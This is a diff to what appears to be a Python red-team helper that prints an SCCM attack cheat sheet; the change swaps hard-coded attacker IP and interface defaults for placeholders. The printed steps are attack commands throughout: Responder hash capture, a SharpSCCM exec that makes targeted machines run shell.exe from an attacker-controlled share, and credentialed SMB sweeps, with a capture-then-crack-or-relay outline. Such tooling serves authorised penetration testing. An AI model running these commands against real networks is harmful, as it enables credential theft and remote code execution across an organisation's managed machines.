@@ -14,6 +14,8 @@ def run():
     user    = input_or_session("username", "Username")
     pw      = input_or_session("password", "Password")
     sccm_ip = prompt("SCCM / SMS Site Server IP or FQDN")
+    attacker = SESSION.get("attacker_ip") or "<ATTACKER_IP>"
+    iface = SESSION.get("attacker_iface") or "<INTERFACE>"
 
     print(f"""
   {C}── CREDENTIAL EXTRACTION ────────────────────────────────────────{RST}
@@ -263,7 +265,7 @@ def run():
   Coerce or wait for push → capture hash → crack or relay.
 
   {Y}Method 1 — Wait for automatic push (passive):{RST}
-  sudo responder -I {SESSION.get("attacker_iface","tun0")} -rdwv
+  sudo responder -I {iface} -rdwv
   # Wait for push account to authenticate to attacker host
 
   {Y}Method 2 — Trigger push via AD discovery:{RST}
@@ -328,7 +330,7 @@ def run():
 
   .\\SharpSCCM.exe exec -s {sccm_ip} \\
     -n "{target_coll}" \\
-    -p "cmd /c \\\\\\\\{SESSION.get("attacker_ip","10.10.14.5")}\\\\share\\\\shell.exe"
+    -p "cmd /c \\\\\\\\{attacker}\\\\share\\\\shell.exe"
 
   {Y}SCCMHunter — deploy via admin rights:{RST}
   python3 sccmhunter.py admin \\
@@ -407,7 +409,7 @@ def run():
   dig SRV _mssms._tcp.{dom} @{dc}
 
   {Y}nxc smb — identify SCCM servers:{RST}
-  nxc smb {SESSION.get("attacker_ip","10.10.14.5")}/24 \\
+  nxc smb {attacker}/24 \\
     -u '{user}' -p '{pw}' -d {dom} \\
     -M sccm
 
